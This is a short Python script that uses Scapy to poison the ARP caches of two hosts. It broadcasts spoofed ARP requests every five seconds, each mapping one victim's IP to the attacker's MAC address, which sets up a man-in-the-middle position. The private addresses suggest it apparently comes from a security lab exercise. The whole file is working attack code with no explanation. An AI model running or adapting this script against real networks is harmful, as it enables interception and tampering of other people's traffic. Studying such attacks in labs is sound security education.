from scapy.all import *
from time import *

IP_A    = "192.168.60.2"
IP_B    = "10.0.2.7"
MAC_M   = "02:42:c0:a8:3c:03"

print("SENDING SPOOFED ARP REQUEST......")

ether = Ether()
ether.dst = "ff:ff:ff:ff:ff:ff"
ether.src = "02:42:c0:a8:3c:03"

arp = ARP()
arp.psrc  = IP_B
arp.hwsrc = MAC_M
arp.pdst  = IP_A
arp.op = 1
frame1 = ether/arp
arp2 = ARP()
arp2.psrc = IP_A
arp2.hwsrc = MAC_M
arp2.pdst = IP_B
arp2.op = 1
frame2 = ether/arp2
while 1:
  sendp(frame1)
  sendp(frame2)
  sleep(5)

